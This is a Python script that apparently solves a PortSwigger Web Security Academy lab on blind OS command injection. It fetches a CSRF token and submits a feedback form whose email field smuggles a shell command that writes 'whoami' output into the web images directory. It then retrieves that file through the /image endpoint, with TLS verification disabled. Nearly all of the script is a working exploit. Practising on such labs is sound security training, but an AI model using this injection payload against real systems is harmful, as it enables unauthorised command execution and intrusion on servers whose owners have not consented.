#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0aa600da03273e0b8096b7b000ff0037.web-security-academy.net'

# session = requests.Session()

res = requests.get(
    url + '/feedback',
    verify=False,
)

soup = BeautifulSoup(res.text, 'html.parser')
session = res.cookies.get('session')
csrf_token = soup.find('input', {'name': 'csrf'})['value']
print("session: ", session)
print("csrf: ", csrf_token)

cookies = {
    'session': session,
}

data = {
    'csrf': csrf_token,
    'name': 'cuong',
    'email': 'abc%40gmail.com;whoami>/var/www/images/whoami${IFS}||${IFS}',
    'subject': 'abc',
    'message': 'abc',
}

response = requests.post(
    url + '/feedback/submit',
    cookies=cookies,
    data=data,
    verify=False,
)

params = {
    'filename': 'whoami'
}

response = requests.get(
    url + '/image',
    params=params,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
